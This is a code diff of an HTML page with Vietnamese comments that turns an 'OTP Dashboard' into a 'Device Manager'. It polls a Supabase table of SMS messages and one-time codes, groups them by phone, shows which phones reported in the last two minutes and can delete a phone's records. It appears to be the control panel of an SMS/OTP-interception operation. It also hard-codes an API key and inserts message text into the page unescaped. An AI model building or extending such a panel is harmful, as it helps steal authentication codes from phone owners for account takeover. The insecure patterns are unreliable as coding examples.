@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>OTP Dashboard</title>
+<title>Device Manager</title>
 
 <style>
 body {
@@ -12,24 +12,37 @@ body {
   padding: 20px;
 }
 
-.item {
+.device {
   background: #1e293b;
-  padding: 12px;
+  padding: 10px;
   margin: 8px 0;
   border-radius: 8px;
-  white-space: pre-line;
+  cursor: pointer;
+}
+
+.online { border-left: 5px solid #22c55e; }
+.offline { border-left: 5px solid #ef4444; }
+
+.sms {
+  margin-left: 20px;
+  margin-top: 10px;
+  background: #020617;
+  padding: 10px;
+  border-radius: 6px;
 }
 </style>
 
 </head>
 <body>
 
-<h2>📩 OTP Dashboard</h2>
-<div id="list"></div>
+<h2>📱 Danh sách thiết bị</h2>
+<div id="devices"></div>
 
 <script>
 const URL = "https://zxewnhxxojggatsyukif.supabase.co/rest/v1/sms";
 const KEY = "sb_publishable_AGpmkNidqBHY_dnz_TRJ0g_ZarfbeQi";
+
+let allData = [];
 
 function load() {
   fetch(URL + "?order=created_at.desc", {
@@ -40,29 +53,92 @@ function load() {
   })
   .then(res => res.json())
   .then(data => {
-    const list = document.getElementById("list");
-    list.innerHTML = "";
+    allData = data;
+    renderDevices();
+  });
+}
 
-    data.forEach(s => {
-      let div = document.createElement("div");
-      div.className = "item";
+function renderDevices() {
+  const container = document.getElementById("devices");
+  container.innerHTML = "";
 
-      div.innerText =
-        "📱 " + (s.device || "Unknown device") + "\n" +
-        "🔢 OTP: " + s.otp + "\n" +
-        "📩 " + s.content;
+  const grouped = {};
 
-      list.appendChild(div);
-    });
+  // gom theo device
+  allData.forEach(s => {
+    if (!grouped[s.device]) grouped[s.device] = [];
+    grouped[s.device].push(s);
+  });
+
+  Object.keys(grouped).forEach(device => {
+    const list = grouped[device];
+
+    const lastTime = new Date(list[0].created_at);
+    const now = new Date();
+
+    const isOnline = (now - lastTime) < 120000; // 2 phút
+
+    const div = document.createElement("div");
+    div.className = "device " + (isOnline ? "online" : "offline");
+
+    div.innerHTML = `
+      <b>${device}</b>
+      <br>
+      ${isOnline ? "🟢 Online" : "🔴 Offline"}
+      <br>
+      <button onclick="deleteDevice('${device}')">🗑 Xoá</button>
+    `;
+
+    // click để mở SMS
+    div.onclick = () => showSMS(device);
+
+    container.appendChild(div);
+  });
+}
+
+function showSMS(device) {
+  const list = allData.filter(s => s.device === device);
+
+  let html = "<div class='sms'>";
+
+  list.forEach(s => {
+    html += `
+      <div>
+        🔢 ${s.otp}<br>
+        📩 ${s.content}
+        <hr>
+      </div>
+    `;
+  });
+
+  html += "</div>";
+
+  document.querySelectorAll(".sms").forEach(e => e.remove());
+  event.currentTarget.insertAdjacentHTML("beforeend", html);
+}
+
+// xoá máy
+function deleteDevice(device) {
+  event.stopPropagation();
+
+  fetch(URL + "?device=eq." + encodeURIComponent(device), {
+    method: "DELETE",
+    headers: {
+      "apikey": KEY,
+      "Authorization": "Bearer " + KEY
+    }
   })
-  .catch(err => console.log(err));
+  .then(() => {
+    alert("Đã xoá máy!");
+    load();
+  });
 }
 
 // load lần đầu
 load();
 
-// tự refresh mỗi 2 giây
-setInterval(load, 2000);
+// auto refresh
+setInterval(load, 3000);
 </script>
 
 </body>
